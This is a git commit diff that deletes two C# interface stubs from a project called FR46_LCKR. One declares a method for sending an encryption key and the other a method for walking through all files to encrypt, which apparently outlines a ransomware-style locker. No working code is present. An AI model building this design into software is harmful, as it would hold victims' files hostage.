8e8f2fa60b953575d244c83fec9bac99ebd40732
X3ASS3xE <ereyes166@student.alamo.edu>
2022-03-21 13:59:16 -0500

    Summary

--- FR46_LCKR/Interface/IComms.cs
+++
@@ -1,9 +0,0 @@
-﻿using System;
-//Interface to implement sending of Encryption Key
-namespace FR46_LCKR.Interface
-{
-     internal interface IComms
-    {
-        void S_Data(string ECryption_Key);
-    }
-}
--- FR46_LCKR/Interface/IFil_Parsr.cs
+++
@@ -1,9 +0,0 @@
-﻿using System;
-namespace FR46_LCKR
-    // Interface to implement Parsing through all files to encrypt
-{
-    internal interface IFil_Parsr
-    {
-        void Par_File(string fPath);
-    }
-}
